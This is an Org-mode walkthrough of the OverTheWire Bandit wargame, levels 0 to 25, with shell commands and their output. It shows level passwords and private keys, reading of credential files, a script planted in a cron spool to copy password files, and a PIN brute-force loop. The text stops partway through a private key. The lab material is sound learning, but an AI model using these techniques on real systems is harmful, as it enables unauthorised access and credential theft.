
https://overthewire.org/wargames/bandit/bandit0.html

* Level 0

#+begin_src bash :dir /ssh:bandit0@bandit.labs.overthewire.org#2220:
 ls
 cat readme
#+end_src

#+RESULTS:
| readme                           |
| NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL |

* Level 1

#+begin_src bash :dir /ssh:bandit1@bandit.labs.overthewire.org#2220:
 ls
 cat ./-
#+end_src

#+RESULTS:
| -                                |
| rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi |

* Level 2

#+begin_src bash :dir /ssh:bandit2@bandit.labs.overthewire.org#2220:
 ls
 cat *
#+end_src

#+RESULTS:
| spaces                           | in | this | filename |
| aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG |    |      |          |

* Level 3

#+begin_src bash :dir /ssh:bandit3@bandit.labs.overthewire.org#2220:
 cd inhere
 ls -la
 cat .hidden
#+end_src

#+RESULTS:
| total                            | 12 |         |         |      |     |    |       |         |
| drwxr-xr-x                       |  2 | root    | root    | 4096 | Jan | 11 | 19:19 | .       |
| drwxr-xr-x                       |  3 | root    | root    | 4096 | Jan | 11 | 19:19 | ..      |
| -rw-r-----                       |  1 | bandit4 | bandit3 |   33 | Jan | 11 | 19:19 | .hidden |
| 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe |    |         |         |      |     |    |       |         |

* Level 4

#+begin_src bash :dir /ssh:bandit4@bandit.labs.overthewire.org#2220:
cd inhere
ls -la
file ./*
cat ./-file07
#+end_src

#+RESULTS:
| total                            |    48 |         |         |      |     |    |       |         |
| drwxr-xr-x                       |     2 | root    | root    | 4096 | Jan | 11 | 19:19 | .       |
| drwxr-xr-x                       |     3 | root    | root    | 4096 | Jan | 11 | 19:19 | ..      |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file00 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file01 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file02 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file03 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file04 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file05 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file06 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file07 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file08 |
| -rw-r-----                       |     1 | bandit5 | bandit4 |   33 | Jan | 11 | 19:19 | -file09 |
| ./-file00:                       |  data |         |         |      |     |    |       |         |
| ./-file01:                       |  data |         |         |      |     |    |       |         |
| ./-file02:                       |  data |         |         |      |     |    |       |         |
| ./-file03:                       |  data |         |         |      |     |    |       |         |
| ./-file04:                       |  data |         |         |      |     |    |       |         |
| ./-file05:                       |  data |         |         |      |     |    |       |         |
| ./-file06:                       |  data |         |         |      |     |    |       |         |
| ./-file07:                       | ASCII | text    |         |      |     |    |       |         |
| ./-file08:                       |  data |         |         |      |     |    |       |         |
| ./-file09:                       |  data |         |         |      |     |    |       |         |
| lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR |       |         |         |      |     |    |       |         |


* Level 5

#+begin_src bash :dir /ssh:bandit5@bandit.labs.overthewire.org#2220:
cd inhere
cat "$(find . -size 1033c -print)"
#+end_src

#+RESULTS:
| P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU |
|                                  |

* Level 6

#+begin_src bash :dir /ssh:bandit6@bandit.labs.overthewire.org#2220:
cat $(find / -user bandit7 -group bandit6 -size 33c -print)
#+end_src

#+RESULTS:
: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

* Level 7
#+begin_src bash :dir /ssh:bandit7@bandit.labs.overthewire.org#2220:
ls -la
head data.txt
grep millionth data.txt
#+end_src

#+RESULTS:
| total      | 4108                             |         |         |         |     |    |       |              |
| drwxr-xr-x | 2                                | root    | root    |    4096 | Jan | 11 | 19:19 | .            |
| drwxr-xr-x | 70                               | root    | root    |    4096 | Jan | 11 | 19:19 | ..           |
| -rw-r--r-- | 1                                | root    | root    |     220 | Jan |  6 |  2022 | .bash_logout |
| -rw-r--r-- | 1                                | root    | root    |    3771 | Jan |  6 |  2022 | .bashrc      |
| -rw-r----- | 1                                | bandit8 | bandit7 | 4184396 | Jan | 11 | 19:19 | data.txt     |
| -rw-r--r-- | 1                                | root    | root    |     807 | Jan |  6 |  2022 | .profile     |
| aboding    | ErTQmlTafRb8szvTLpbV25MPOPEexBsH |         |         |         |     |    |       |              |
| locket's   | fO8zz1eLIJmv24fTys7e7zAWVYdnTbfg |         |         |         |     |    |       |              |
| melt       | HVLgPRIrjbzrbjwFZ5M8aQCavUuRdQtb |         |         |         |     |    |       |              |
| popular    | Rjy5b8oEjivOe4gX82ErCZ7BFZDgVkJP |         |         |         |     |    |       |              |
| odious     | 6JV4M56xFJkIUriwUcJzImGcs55THFQT |         |         |         |     |    |       |              |
| taxonomies | 0TXcsyXyX08nCpuojmbChQflRZIZj5nM |         |         |         |     |    |       |              |
| land       | 3jvaD1qNXximI2EnBFaIO6HQqhylpucs |         |         |         |     |    |       |              |
| elevator   | bqmUOYYKbkoZyKlabxwjbNM6ZpB3y9eG |         |         |         |     |    |       |              |
| vacationed | 2EabBTby3LfWR5y9IHxdvSvqhUStUEeQ |         |         |         |     |    |       |              |
| termed     | hKPxiEJFj0hPdoVvfq15am94F6Azholf |         |         |         |     |    |       |              |
| millionth  | TESKZC0XvTetK0S9xNwm25STk5iWrBvP |         |         |         |     |    |       |              |

* Level 8
#+begin_src bash :dir /ssh:bandit8@bandit.labs.overthewire.org#2220: :results output verbatim
file data.txt
cat data.txt | sort | uniq -c | sort -n | head
#+end_src

#+RESULTS:
#+begin_example
data.txt: ASCII text
      1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
     10 0nWWiILKIHjVQhAySQCVA1OO4pRFzm0g
     10 0Ri9uiagQoqbkaeFEKyT5GksBWdCxTLr
     10 1jzHQ5uo7b0MsA2rjZfwO1u63LVQrOR5
     10 1LSHp948yXLwKZKQHuG7vRbRZ2BiIIoF
     10 20CZYbTfkf0soLqNB3fxk7nyrFPhHjeb
     10 3AKdLZMTOprIKLKt2k70jJvjwzWN5Ver
     10 3BIPRNUpnWyXoLsg9nWQqV5hVFEKpL46
     10 3v5ftmuNblcHE7OgMLu28Rk0a4ZfR5UQ
     10 4LMsh6PCDJVLecGZYNzLupTNylExWhcW
#+end_example

* Level 9
#+begin_src bash :dir /ssh:bandit9@bandit.labs.overthewire.org#2220: :results output verbatim
strings data.txt | grep -e "==*"
#+end_src

#+RESULTS:
#+begin_example
c========== the
I2=Z
K=y3>
!=j$u
h;========== password
========== isT
E=XQ
[Qi#Z=c
i=|V
!/=j>:]zx
r>i"=
XZ>~=
n.E========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
~UtFS=
eY4<={_
#+end_example

* Level 10
#+begin_src bash :dir /ssh:bandit10@bandit.labs.overthewire.org#2220: :results output verbatim
base64 -d data.txt
#+end_src

#+RESULTS:
: The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

* Level 11
#+begin_src bash :dir /ssh:bandit11@bandit.labs.overthewire.org#2220: :results output verbatim
tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
#+end_src

#+RESULTS:
: The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

* Level 12
#+begin_src bash :dir /ssh:bandit12@bandit.labs.overthewire.org#2220: :results output verbatim
ls -l
DIR=$(mktemp --directory -p /tmp)
echo $DIR
xxd -r < data.txt > $DIR/1
file $DIR/1
cd $DIR
zcat < 1 > 2
ls -l
file 2
bzip2 -d 2
ls -l
file 2.out
zcat < 2.out > 3
file 3
tar -xvf 3
file data5.bin
tar -xvf data5.bin
file data6.bin
bzip2 -d data6.bin
file data6.bin.out
tar -xvf data6.bin.out
file data8.bin
zcat < data8.bin 
#+end_src

#+RESULTS:
#+begin_example
total 4
-rw-r----- 1 bandit13 bandit12 2581 Jan 11 19:18 data.txt
/tmp/tmp.kdEnTlalnh
/tmp/tmp.kdEnTlalnh/1: gzip compressed data, was "data2.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 572
total 8
-rw-rw-r-- 1 bandit12 bandit12 605 Jan 30 16:23 1
-rw-rw-r-- 1 bandit12 bandit12 572 Jan 30 16:23 2
2: bzip2 compressed data, block size = 900k
total 8
-rw-rw-r-- 1 bandit12 bandit12 605 Jan 30 16:23 1
-rw-rw-r-- 1 bandit12 bandit12 434 Jan 30 16:23 2.out
2.out: gzip compressed data, was "data4.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 20480
3: POSIX tar archive (GNU)
data5.bin
data5.bin: POSIX tar archive (GNU)
data6.bin
data6.bin: bzip2 compressed data, block size = 900k
data6.bin.out: POSIX tar archive (GNU)
data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 49
The password is 
#+end_example

* Level 13
#+begin_src bash :dir /ssh:bandit13@bandit.labs.overthewire.org#2220: :results output verbatim
ssh -p 2220 -o StrictHostKeyChecking=no -i sshkey.private bandit14@localhost cat /etc/bandit_pass/bandit14 
#+end_src

#+RESULTS:
: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

* Level 14
#+begin_src bash :dir /ssh:bandit14@bandit.labs.overthewire.org#2220: :results output verbatim
echo "fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq" | nc -v localhost 30000
#+end_src

#+RESULTS:
: Correct!
: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
: 

* Level 15

#+begin_src bash :dir /ssh:bandit15@bandit.labs.overthewire.org#2220: :results output verbatim
printf  "%s\n" "jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt" | openssl s_client -quiet -connect localhost:30001
#+end_src

#+RESULTS:
: Correct!
: JQttfApK4SeyHwDlI9SXGR50qclOAil1
:

* Level 16
#+begin_src bash :dir /ssh:bandit16@bandit.labs.overthewire.org#2220: :results output verbatim
ports=$(netstat -ln | awk '{print $4}' | tr -d ':' | sort -n)
for p in $ports
do
    if [ "$p" -ge 31000 -a "$p" -le 32000 ]
    then
        echo puerto abierto "$p"
        printf "%s\n" "JQttfApK4SeyHwDlI9SXGR50qclOAil1" | timeout 2 openssl s_client -quiet -connect localhost:"$p"
    fi
done

#+end_src

#+RESULTS:
#+begin_example
puerto abierto 31518
JQttfApK4SeyHwDlI9SXGR50qclOAil1
puerto abierto 31790
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

#+end_example



* Level 17
#+begin_src bash :results output verbatim
cat > ./bandit-16-17-private-key <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
EOF
chmod 400 ./bandit-16-17-private-key
ssh bandit17@bandit.labs.overthewire.org -p 2220 -i ./bandit-16-17-private-key <<EOF
ls
diff passwords.new passwords.old
EOF
#+end_src 

#+RESULTS:
: passwords.new
: passwords.old
: 42c42
: < hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
: ---
: > 810zq8IK64u5A9Lb2ibdTGBtlcSZsoe8

* Level 18

#+begin_src bash :results output verbatim
sshpass -p hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg ssh bandit18@bandit.labs.overthewire.org -p 2220 <<EOF
cat readme
EOF
#+end_src

#+RESULTS:
: awhqfNnAbc1naukrpqDYcF95h7HoMTrC

* Level 19
#+begin_src bash :results output verbatim
sshpass -p awhqfNnAbc1naukrpqDYcF95h7HoMTrC ssh bandit19@bandit.labs.overthewire.org -p 2220 <<EOF
ls -l
./bandit20-do cat /etc/bandit_pass/bandit20
EOF
#+end_src

#+RESULTS:
: total 16
: -rwsr-x--- 1 bandit20 bandit19 14876 Jan 11 19:18 bandit20-do
: VxCazJaVykI6W36BkBU0mJTCM8rR95XT


* Level 20
#+begin_src bash :results output verbatim
sshpass -p VxCazJaVykI6W36BkBU0mJTCM8rR95XT ssh bandit20@bandit.labs.overthewire.org -p 2220 <<EOF
printf "%s\n" VxCazJaVykI6W36BkBU0mJTCM8rR95XT | nc -N -v -l -p  4322 &
timeout 2 ./suconnect 4322
EOF
#+end_src

#+RESULTS:
: Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
: Password matches, sending next password
: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

* Level 21
#+begin_src bash :results output verbatim
sshpass -p NvEJF7oVjkddltPSrdKEFOllh9V1IBcq ssh bandit21@bandit.labs.overthewire.org -p 2220 <<EOF
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat  /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
EOF
#+end_src

#+RESULTS:
#+begin_example
cronjob_bandit15_root
cronjob_bandit17_root
cronjob_bandit22
cronjob_bandit23
cronjob_bandit24
cronjob_bandit25_root
e2scrub_all
otw-tmp-dir
sysstat
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
,* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
#+end_example


* Level 22
#+begin_src bash :results output verbatim
sshpass -p WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff ssh bandit22@bandit.labs.overthewire.org -p 2220 <<EOF
ls -la /etc/cron.d
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
EOF
#+end_src

#+RESULTS:
#+begin_example
total 56
drwxr-xr-x   2 root root  4096 Jan 11 19:19 .
drwxr-xr-x 108 root root 12288 Jan 11 19:19 ..
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root    62 Jan 11 19:18 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Jan 11 19:18 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Jan 11 19:18 cronjob_bandit22
-rw-r--r--   1 root root   122 Jan 11 19:18 cronjob_bandit23
-rw-r--r--   1 root root   120 Jan 11 19:18 cronjob_bandit24
-rw-r--r--   1 root root    62 Jan 11 19:18 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Jan 11 19:19 otw-tmp-dir
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
,* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
#+end_example


* Level 23


#+begin_src bash :results output verbatim
sshpass -p QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G ssh bandit23@bandit.labs.overthewire.org -p 2220 <<EOF
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
ls -la /var/spool/bandit24
cat > /var/spool/bandit24/foo/alvaro.sh <<INNER
cat /etc/bandit_pass/bandit24 > /tmp/alvaro.sh.out 2&>1
cat /etc/bandit_pass/bandit23 >> /tmp/alvaro.sh.out 2&>1
cat /etc/bandit_pass/bandit25 >> /tmp/alvaro.sh.out 2&>1
cat el intento de las \$(date)
INNER
chmod +x /var/spool/bandit24/foo/alvaro.sh
EOF
#+end_src

#+RESULTS:
#+begin_example
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
,* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

total 12
dr-xr-x--- 3 bandit24 bandit23 4096 Jan 11 19:18 .
drwxr-xr-x 5 root     root     4096 Jan 11 19:18 ..
drwxrwx-wx 7 root     bandit24 4096 Feb 15 18:02 foo
total 136
-r-------- 1 bandit0  bandit0   8 Jan 11 19:18 bandit0
-r-------- 1 bandit1  bandit1  33 Jan 11 19:18 bandit1
-r-------- 1 bandit10 bandit10 33 Jan 11 19:18 bandit10
-r-------- 1 bandit11 bandit11 33 Jan 11 19:18 bandit11
-r-------- 1 bandit12 bandit12 33 Jan 11 19:18 bandit12
-r-------- 1 bandit13 bandit13 33 Jan 11 19:18 bandit13
-r-------- 1 bandit14 bandit14 33 Jan 11 19:18 bandit14
-r-------- 1 bandit15 bandit15 33 Jan 11 19:18 bandit15
-r-------- 1 bandit16 bandit16 33 Jan 11 19:18 bandit16
-r-------- 1 bandit17 bandit17 33 Jan 11 19:18 bandit17
-r-------- 1 bandit18 bandit18 33 Jan 11 19:18 bandit18
-r-------- 1 bandit19 bandit19 33 Jan 11 19:18 bandit19
-r-------- 1 bandit2  bandit2  33 Jan 11 19:18 bandit2
-r-------- 1 bandit20 bandit20 33 Jan 11 19:18 bandit20
-r-------- 1 bandit21 bandit21 33 Jan 11 19:18 bandit21
-r-------- 1 bandit22 bandit22 33 Jan 11 19:18 bandit22
-r-------- 1 bandit23 bandit23 33 Jan 11 19:18 bandit23
-r-------- 1 bandit24 bandit24 33 Jan 11 19:18 bandit24
-r-------- 1 bandit25 bandit25 33 Jan 11 19:18 bandit25
-r-------- 1 bandit26 bandit26 33 Jan 11 19:18 bandit26
-r-------- 1 bandit27 bandit27 33 Jan 11 19:18 bandit27
-r-------- 1 bandit28 bandit28 33 Jan 11 19:18 bandit28
-r-------- 1 bandit29 bandit29 33 Jan 11 19:18 bandit29
-r-------- 1 bandit3  bandit3  33 Jan 11 19:18 bandit3
-r-------- 1 bandit30 bandit30 33 Jan 11 19:18 bandit30
-r-------- 1 bandit31 bandit31 33 Jan 11 19:18 bandit31
-r-------- 1 bandit32 bandit32 33 Jan 11 19:18 bandit32
-r-------- 1 bandit33 bandit33 33 Jan 11 19:18 bandit33
-r-------- 1 bandit4  bandit4  33 Jan 11 19:18 bandit4
-r-------- 1 bandit5  bandit5  33 Jan 11 19:18 bandit5
-r-------- 1 bandit6  bandit6  33 Jan 11 19:18 bandit6
-r-------- 1 bandit7  bandit7  33 Jan 11 19:18 bandit7
-r-------- 1 bandit8  bandit8  33 Jan 11 19:18 bandit8
-r-------- 1 bandit9  bandit9  33 Jan 11 19:18 bandit9

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

#+end_example

* Level 24

#+begin_src bash :results output verbatim
sshpass -p VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ssh bandit24@bandit.labs.overthewire.org -p 2220 <<EOF
for I in \$(seq 0 9999)
do
   printf "%s %04d\n" VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar \$I 
done | nc localhost 30002 | grep -v Wrong
EOF
#+end_src

#+RESULTS:
: I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
: Correct!
: The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
: 
: Exiting.

* Level 25

#+begin_src bash :results output verbatim
sshpass -p p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d ssh bandit25@bandit.labs.overthewire.org -p 2220 <<EOF
ls -la
cat bandit26.sshkey
cat /usr/bin/showtext
grep bandit26 /etc/passwd

EOF
#+end_src

#+RESULTS:
#+begin_example
total 32
drwxr-xr-x  2 root     root     4096 Oct  5 06:19 .
drwxr-xr-x 70 root     root     4096 Oct  5 06:20 ..
-rw-r-----  1 bandit25 bandit25   33 Oct  5 06:19 .bandit24.password
-rw-r--r--  1 root     root      220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root     3771 Jan  6  2022 .bashrc
-rw-r-----  1 bandit25 bandit25    4 Oct  5 06:19 .pin
-rw-r--r--  1 root     root      807 Jan  6  2022 .profile
-r--------  1 bandit25 bandit25 1679 Oct  5 06:19 bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
